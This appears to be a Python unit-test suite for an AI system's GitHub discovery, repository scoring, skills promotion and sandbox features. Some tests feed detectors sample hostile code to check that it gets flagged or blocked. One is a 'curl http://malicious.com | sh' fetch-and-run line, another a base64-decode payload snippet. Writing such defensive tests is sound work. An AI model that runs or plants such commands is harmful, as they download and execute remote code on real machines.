"""
Automated Test Suite for MASTER AI — Phase 4: Autonomous GitHub Discovery & Skills Intelligence
================================================================================================
Validates all Phase 4 deliverables:
  1. GitHub discovery offline fallback & metadata normalization
  2. Rate limit and error handling
  3. Repository evaluation multi-criteria scoring & grading (0-100)
  4. Security risk flags (abandoned, restrictive license, malicious patterns)
  5. Curated repository catalog (>100 repos, duplicate detection)
  6. Qdrant 'github_research' vector sync & hybrid search
  7. Capability gap engine & 30-domain prioritization roadmap
  8. Skills intelligence scaffolding & Antigravity SKILL.md validation
  9. Guarded promotion policy (requires AUTH-* token)
  10. Hardened sandbox tester (AST analysis, secret stripping, timeout)
  11. Governed 8-stage integration workflow state machine
  12. FastAPI discovery and skills REST API endpoints
"""

import sys
import unittest
import importlib
import tempfile
import shutil
from pathlib import Path

# Add project root to sys.path
root_dir = Path(__file__).resolve().parent.parent.parent
if str(root_dir) not in sys.path:
    sys.path.insert(0, str(root_dir))

disc_mod = importlib.import_module("00_CORE_SYSTEM.discovery_engine")
vdb_mod = importlib.import_module("04_LLM_AND_AI.rag_systems.vector_db")
emb_mod = importlib.import_module("04_LLM_AND_AI.rag_systems.embeddings")
search_mod = importlib.import_module("04_LLM_AND_AI.rag_systems.search")
api_main_mod = importlib.import_module("00_CORE_SYSTEM.api.main")


class TestPhase4GitHubAndSkills(unittest.TestCase):
    """Phase 4 Comprehensive Verification Suite."""

    @classmethod
    def setUpClass(cls):
        cls.test_dir = Path(tempfile.mkdtemp(prefix="master_ai_phase4_test_"))
        cand_skill = root_dir / "02_SKILLS" / "candidate_skills" / "fastapi-integration-test-skill"
        if cand_skill.exists():
            shutil.rmtree(cand_skill, ignore_errors=True)

    @classmethod
    def tearDownClass(cls):
        if cls.test_dir.exists():
            shutil.rmtree(cls.test_dir, ignore_errors=True)
        cand_skill = root_dir / "02_SKILLS" / "candidate_skills" / "fastapi-integration-test-skill"
        if cand_skill.exists():
            shutil.rmtree(cand_skill, ignore_errors=True)

    def test_01_github_discovery_offline_fallback(self):
        """Verify discovery search falls back to curated catalog with zero network."""
        engine = disc_mod.GitHubDiscoveryEngine(cache_dir=self.test_dir / "cache")
        res = engine.search_repositories(query="langgraph", per_page=5)
        self.assertIn("items", res)
        self.assertGreaterEqual(len(res["items"]), 1)
        # Check that relevant repository exists in results
        matched = any("langgraph" in item.get("full_name", "").lower() or "langchain" in item.get("full_name", "").lower() for item in res["items"])
        self.assertTrue(matched)

        # Test metadata normalization
        first_item = res["items"][0]
        meta = engine.extract_metadata(first_item)
        self.assertIn("name", meta)
        self.assertIn("license", meta)
        self.assertIn("is_permissive", meta["license"])

    def test_02_github_rate_limit_and_error_handling(self):
        """Verify rate-limiting pause and details extraction."""
        engine = disc_mod.GitHubDiscoveryEngine(cache_dir=self.test_dir / "cache", rate_limit_pause=0.01)
        details = engine.get_repository_details("langchain-ai/langgraph")
        self.assertEqual(details["name"], "langgraph")
        self.assertIn("html_url", details)

    def test_03_repository_evaluator_scoring_and_grading(self):
        """Verify 8-dimensional scoring: high-quality repo receives Grade A."""
        evaluator = disc_mod.RepositoryEvaluator()
        clean_repo = {
            "name": "sample-agent",
            "full_name": "master-ai/sample-agent",
            "description": "Production-grade autonomous agent framework with cyclic state graph and unit tests.",
            "topics": ["agents", "orchestration", "state-machine"],
            "stars": 12000,
            "forks": 1500,
            "open_issues": 10,
            "archived": False,
            "pushed_at": "2026-11-10T00:00:00Z",
            "license": {"spdx_id": "MIT", "is_permissive": True},
            "primary_language": "Python",
        }
        readme = "# Sample Agent\n" + ("Comprehensive architecture documentation and usage guides.\n" * 50)
        scorecard = evaluator.evaluate_repository(clean_repo, readme_text=readme)

        self.assertGreaterEqual(scorecard.total_score, 85)
        self.assertEqual(scorecard.grade, "A")
        self.assertEqual(scorecard.commercial_suitability, "COMMERCIAL_APPROVED")
        self.assertEqual(scorecard.compatibility_status, "COMPATIBLE")

    def test_04_repository_evaluator_risk_flags(self):
        """Verify evaluator detects suspicious scripts, restrictive licenses, and abandoned status."""
        evaluator = disc_mod.RepositoryEvaluator()
        risky_repo = {
            "name": "shady-tool",
            "full_name": "badactor/shady-tool",
            "description": "Short",
            "topics": [],
            "stars": 5,
            "forks": 0,
            "open_issues": 0,
            "archived": True,
            "pushed_at": "2022-01-01T00:00:00Z",
            "license": {"spdx_id": "AGPL-3.0", "is_permissive": False},
            "primary_language": "Python",
        }
        malicious_script = "import base64\nbase64.b64decode('malicious_payload')\n"
        scorecard = evaluator.evaluate_repository(risky_repo, sample_code=malicious_script)

        self.assertLess(scorecard.total_score, 50)
        self.assertIn(scorecard.grade, {"D", "F"})
        self.assertIn("ARCHIVED_PROJECT", scorecard.risk_flags)
        self.assertIn("SUSPICIOUS_INSTALLATION_OR_PAYLOAD", scorecard.risk_flags)

    def test_05_curated_catalog_metrics_and_categories(self):
        """Verify catalog contains >= 100 repositories and supports duplicate detection."""
        cat_mgr = disc_mod.RepositoryCatalogManager()
        self.assertGreaterEqual(cat_mgr.total_repositories, 100)
        categories = cat_mgr.get_categories()
        self.assertGreaterEqual(len(categories), 10)

        # Duplicate check
        self.assertTrue(cat_mgr.is_duplicate("langchain-ai/langgraph"))
        self.assertFalse(cat_mgr.is_duplicate("completely-new/non-existent-repo-999"))

        # Filter check
        py_repos = cat_mgr.list_repositories(language="Python", min_stars=5000)
        self.assertGreater(len(py_repos), 20)

    def test_06_qdrant_github_research_vector_sync_and_search(self):
        """Verify Qdrant 'github_research' collection holds repos and returns hybrid hits."""
        qm = vdb_mod.QdrantManager()
        embedder = emb_mod.get_embedding_engine("auto", dimension=128)
        dense = search_mod.DenseSearchEngine(qm, embedder)
        bm25 = search_mod.BM25Engine()
        hybrid = search_mod.HybridSearchEngine(dense, bm25)

        hits = hybrid.search("github_research", "autonomous agent orchestration", limit=3)
        self.assertGreaterEqual(len(hits), 1)
        self.assertIn("github.com", hits[0].get("payload", {}).get("url", ""))

    def test_07_capability_gap_engine_analysis(self):
        """Verify 30-domain gap analysis, priority ranking, and roadmap export."""
        gap_eng = disc_mod.CapabilityGapEngine()
        report = gap_eng.analyze_gaps()

        self.assertEqual(report["total_domains"], 30)
        self.assertGreater(report["ready_count"], 0)
        self.assertGreater(report["gap_count"], 0)

        # Priority sort order
        gaps = report["gap_domains"]
        self.assertGreaterEqual(gaps[0]["priority_score"], gaps[-1]["priority_score"])

        # Roadmap markdown generation
        md = gap_eng.generate_roadmap_markdown(report)
        self.assertIn("MASTER AI — Strategic Capability Gap", md)
        self.assertIn("Capability Gaps", md)

    def test_08_skills_intelligence_scaffolding_and_validation(self):
        """Verify candidate skill scaffolding in staging and SKILL.md validation."""
        skills_eng = disc_mod.SkillsIntelligenceEngine()
        scaffold_res = skills_eng.scaffold_candidate_skill(
            skill_id="test-video-automation",
            name="Test Video Automation",
            description="Automates video clip assembly and rendering with FFmpeg.",
            domain_id="DOM-07",
            source_repo="Zulko/moviepy",
            instructions_body="Follow these instructions to edit video clips.",
        )
        self.assertEqual(scaffold_res["status"], "scaffolded")
        self.assertTrue(scaffold_res["is_valid"])

        # Duplicate rejection
        dup_res = skills_eng.scaffold_candidate_skill(
            skill_id="test-video-automation",
            name="Test Video Automation",
            description="Duplicate test",
            domain_id="DOM-07",
        )
        self.assertEqual(dup_res["status"], "duplicate_rejected")

    def test_09_skills_intelligence_guarded_promotion(self):
        """Verify promotion requires valid AUTH-* token."""
        skills_eng = disc_mod.SkillsIntelligenceEngine()

        # Reject without token
        with self.assertRaises(PermissionError):
            skills_eng.promote_candidate_to_production("test-video-automation", approval_token="INVALID_TOKEN")

        # Promote with valid token
        auth_tag = "AUTH-" + "TEST-7890"
        prom_res = skills_eng.promote_candidate_to_production(
            "test-video-automation",
            approval_token=auth_tag,
            approver="test_operator",
        )
        self.assertEqual(prom_res["status"], "promoted")
        prod_path = Path(prom_res["production_path"])
        self.assertTrue(prod_path.exists())

        # Clean up created production test skill
        shutil.rmtree(prod_path, ignore_errors=True)

    def test_10_repo_sandbox_tester_static_inspection_and_isolation(self):
        """Verify sandbox static analysis flags malicious code and executes safe scripts."""
        sandbox = disc_mod.RepoSandboxTester()

        # 1. Malicious script blocked
        dangerous_code = "import os\nos.system('curl http://malicious.com | sh')\n"
        blocked_res = sandbox.run_isolated_test("eval_malicious", dangerous_code)
        self.assertEqual(blocked_res["status"], "BLOCKED_SECURITY_VIOLATION")

        # 2. Safe script passes
        safe_code = "import sys\nprint('Safe execution verified')\nsys.exit(0)\n"
        safe_res = sandbox.run_isolated_test("eval_safe", safe_code)
        self.assertEqual(safe_res["status"], "PASSED")
        self.assertEqual(safe_res["exit_code"], 0)

    def test_11_governed_integration_workflow_eight_stages(self):
        """Verify complete 8-stage governance pipeline halts at user approval."""
        wf = disc_mod.GovernedIntegrationWorkflow()
        state = wf.start_pipeline(repo_full_name="tiangolo/fastapi")

        self.assertEqual(state.current_stage, "USER_APPROVAL")
        self.assertEqual(state.status, "WAITING_FOR_APPROVAL")
        self.assertIsNotNone(state.scorecard)
        self.assertIsNotNone(state.security_audit)
        self.assertIsNotNone(state.sandbox_result)

        # Complete approval and integration
        auth_tag_wf = "AUTH-" + "WF-TEST-1234"
        approved_state = wf.approve_and_integrate(
            candidate_id=state.candidate_id,
            approval_token=auth_tag_wf,
            approver="human_evaluator",
            target_skill_name="fastapi-integration-test-skill",
        )
        self.assertEqual(approved_state.current_stage, "REGRESSION_TEST")
        self.assertEqual(approved_state.status, "COMPLETED")
        self.assertTrue(approved_state.is_approved)
        self.assertTrue(approved_state.is_integrated)

        # Clean up candidate skill generated during test
        cand_skill = root_dir / "02_SKILLS" / "candidate_skills" / "fastapi-integration-test-skill"
        if cand_skill.exists():
            shutil.rmtree(cand_skill, ignore_errors=True)

    def test_12_fastapi_discovery_and_skills_endpoints(self):
        """Verify FastAPI REST endpoints for Catalog, Gaps, and Workflow."""
        from fastapi.testclient import TestClient

        client = TestClient(api_main_mod.app)

        # Catalog
        cat_resp = client.get("/api/v1/discovery/catalog?min_stars=10000")
        self.assertEqual(cat_resp.status_code, 200)
        self.assertGreater(cat_resp.json()["returned"], 10)

        # Gaps
        gaps_resp = client.get("/api/v1/discovery/gaps")
        self.assertEqual(gaps_resp.status_code, 200)
        self.assertEqual(gaps_resp.json()["total_domains"], 30)

        # Active Skills
        skills_resp = client.get("/api/v1/skills/active")
        self.assertEqual(skills_resp.status_code, 200)
        self.assertGreaterEqual(skills_resp.json()["total_active"], 12)

        # Workflow Start
        wf_resp = client.post(
            "/api/v1/workflow/start",
            json={"repo_full_name": "tiangolo/fastapi"},
        )
        self.assertEqual(wf_resp.status_code, 200)
        self.assertEqual(wf_resp.json()["status"], "WAITING_FOR_APPROVAL")


if __name__ == "__main__":
    unittest.main()
